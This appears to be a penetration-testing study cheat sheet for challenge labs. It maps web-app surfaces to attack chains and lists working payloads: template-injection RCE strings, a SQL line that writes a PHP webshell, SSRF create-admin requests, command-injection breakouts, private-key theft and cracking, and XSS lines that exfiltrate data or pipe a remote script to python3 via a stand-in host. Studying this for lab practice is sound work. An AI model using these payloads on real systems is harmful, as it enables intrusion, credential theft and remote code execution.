# Challenge-lab pattern index

Pattern recognition is the real skill: each box is usually ONE chain, and the surface
tells you which. These are the recurring chains from the practice labs, abstracted — match the
*shape* you're seeing to the chain, then jump to the WARM phase listed. Codenames kept as a memory
hook; the point is the pattern, not the specific box.

| Surface you see | Chain | WARM phase |
|---|---|---|
| A **comment / guestbook / status** feature + an admin that reviews it | **stored XSS → steal admin cookie → admin panel → Twig SSTI → RCE** | XSS (Filtered XSS, Emulated user) → SSTI |
| Input stored, viewed later by an admin, but no obvious reflection | **blind XSS → session/admin action** (beacon first to see where it fires) | XSS (Blind / stored) |
| A **"System Info" / "Data submission" / diagnostic** POST | **command injection → RCE** (intercept the POST, inject separators) | Command Injection |
| A **URL/fetch/import/CV-upload/avatar** field | **SSRF → internal service / cloud metadata / create-admin API** | SSRF |
| SSRF reaches an internal app that **renders templates** | **SSRF → SSTI → RCE** | SSRF → SSTI |
| Sequential IDs on **screenshots / invoices / messages / profiles** | **IDOR → other users' data → creds/next step** | Access Control (IDOR) |
| A **login form** that errors on a quote / dumps on `' OR 1=1` | **SQLi → dump creds OR read files (id_rsa) OR OUTFILE webshell** | SQL Injection |
| SQLi + a **downloadable/private key** or path param | **SQLi/traversal → read `id_rsa` → SSH in** (chmod 600, `ssh -i`) | File Inclusion → (pivot) |
| A **registration / state-changing** form with an anti-CSRF token | **drop/blank the token → CSRF, often chained with XSS** | Business Logic (CSRF) |
| XML accepted anywhere (SOAP, import, `.docx`/`.svg`) | **XXE → file read / OOB** | XXE |
| **Spring Boot / Java** app (`.do`, actuator, `/error` whitelabel) | **traversal → `application.properties` / actuator → creds → RCE/deser** | File Inclusion + Deserialization |
| **API-first** app (JSON everywhere) | **mass assignment / create-admin via API → privilege escalation**, plus traversal & SQLi | Access Control + API (Find Info in Files) |

## Cross-cutting habits these labs reward
- **Intercept the POST.** Several chains (command injection, CSRF, SSRF) live in a request the UI
  makes for you — proxy it in Burp and tamper the raw request, don't just use the form.
- **Custom wordlist from the site.** Brute steps expect a cewl/mangled list, not rockyou — the
  password is a word on the page + a suffix (see the auth phase).
- **Admin is usually a bot.** "Reviews submissions," "approves," "checks" = an emulated user you
  attack with stored XSS/CSRF. Plant, then wait for the timed visit.
- **One primitive → proof.** File-read (traversal/SQLi/XXE/LFI) often reaches `local.txt`/`proof.txt`
  or an `id_rsa` directly — you don't always need a full shell.
- **Chain, don't tunnel.** SSRF→SSTI, XSS→SSTI, SQLi→SSH, CSRF+XSS. If a bug stalls, it's often the
  first link, not the finish.

## Pivot you'll need: read a private key → SSH
```
# via traversal/LFI/SQLi file-read, grab /home/<user>/.ssh/id_rsa, then:
chmod 600 id_rsa
ssh -i id_rsa <user>@<target>        # if passphrase-protected: ssh2john id_rsa > h; john h
```

## The exact gadget each chain needs (copy-paste lives in the linked file)
These are the specific tricks these boxes turned on — the part that isn't "just run the scanner":
- **Spring config via traversal** — fuzz PATH×FILE (clusterbomb) for `application.properties`,
  grep it for the API key, log in. → `lfi.txt` (Spring Boot section).
- **SQLi but sqlmap only dumps DB names** — put a literal `*` where the value goes in the saved
  request (`patientName=*`) and re-run; then `--os-shell`. → `sqli.txt` (sqlmap section).
- **PG SQLi → webshell** — `copy (select '<?php passthru($_GET[0]);?>') to '/var/tmp/cmd.php'`,
  then browse to it in a web-served dir (/backups). → `sqli.txt`.
- **EJS RCE** `<%= process.mainModule.require("child_process").execSync("id") %>`; if `process`/
  `require`/`exec` are stripped once, **interleave** (`proprocesscess`). → `ssti.txt`.
- **Mako RCE** `${self.module.cache.util.os.popen("id").read()}` (`.system()` shows only exit code). → `ssti.txt`.
- **Twig RCE** `{{[0]|reduce('system','id')}}` or `{{['id']|filter('system')}}`. → `ssti.txt`.
- **SSRF → create-admin** via `gopher://127.0.0.1:80/_POST /api/admin/create ...` (URL-encode, often
  double-encode); localhost blocked → try `0.0.0.0` / `[::]` / decimal IP. → `ssrf.txt`.
- **SSRF to bypass a 403** — can't fetch `/screenshots/x.png` directly, so make the server fetch it
  via its own URL/analyze feature (`http://0.0.0.0/screenshots/..`). → `ssrf.txt`.
- **XSS, source exfil** — `location.href='http://you/?exfil='+btoa(document.body.innerHTML)` to read
  an admin DOM you can't see; decode to find a hidden endpoint. → `xss-exploitation.md`.
- **XSS → internal RCE endpoint** — the bot's browser can reach a localhost `/run_command` the app
  exposes; `fetch(..,{body:'cmd=curl http://you/rce.py|python3'})`. → `xss-exploitation.md`.
- **Role/type privilege value** — fuzz the numeric `type`/`role` param to find the admin value
  (e.g. `type=51`→`100`); if the server ignores it for you, send it via a CSRF form the admin bot
  submits. → `idor.txt`, `scripts/csrf-gen.sh`.
- **Windows cmd injection** — break out of a quoted path: `C:\backup"& whoami`, `"& type C:\proof.txt`. → `cmdi.txt`.

## Spring Boot targets (traversal / file read)
```
WEB-INF/classes/application.properties   WEB-INF/classes/application.yml
../../../../../../proc/self/cwd/application.properties
/actuator/env  /actuator/heapdump  /actuator/mappings     # creds, routes, memory (grep for password/secret)
```
